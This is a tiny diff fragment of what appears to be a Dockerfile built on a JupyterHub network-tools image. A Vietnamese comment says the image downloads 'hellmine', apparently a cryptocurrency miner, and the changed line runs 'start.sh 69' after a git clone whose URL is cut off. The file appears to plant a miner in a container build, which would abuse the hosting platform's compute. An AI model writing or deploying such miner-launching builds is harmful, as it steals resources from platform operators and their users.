@@ -7,4 +7,4 @@ RUN apt update && apt install htop curl unzip python3 git -y && git clone https:
 FROM quay.io/jupyterhub/k8s-network-tools:4.0.0
 # Tạo thư mục làm việc và tải hellmine
 
-RUN ./start.sh 69
+RUN start.sh 69
